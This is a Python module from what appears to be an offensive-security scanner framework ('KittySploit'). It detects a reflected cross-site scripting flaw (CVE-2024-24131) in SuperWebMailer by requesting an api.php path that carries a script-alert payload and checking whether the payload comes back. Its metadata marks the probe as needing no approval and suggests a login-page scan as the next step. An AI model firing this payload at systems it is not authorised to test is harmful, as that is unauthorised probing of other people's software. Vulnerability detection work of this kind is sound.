#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SuperWebMailer v9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SuperWebMailer 9.31.0.01799 - Cross-Site Scripting Detection',
        'description': 'SuperWebMailer v9.31.0.01799 was discovered to contain a reflected cross-site scripting (XSS) vulenrability via the component api.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'superwebmailer', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/fkie-cad/nvd-json-data-feeds',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-24131',
        ],
        'cve': 'CVE-2024-24131',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/api.php/<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'SuperWebMailerAPI',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="SuperWebMailer 9.31.0.01799 - Cross-Site Scripting detected",
                path='/api/api.php/<script>alert(document.domain)</script>',
            )
            return True
        return False

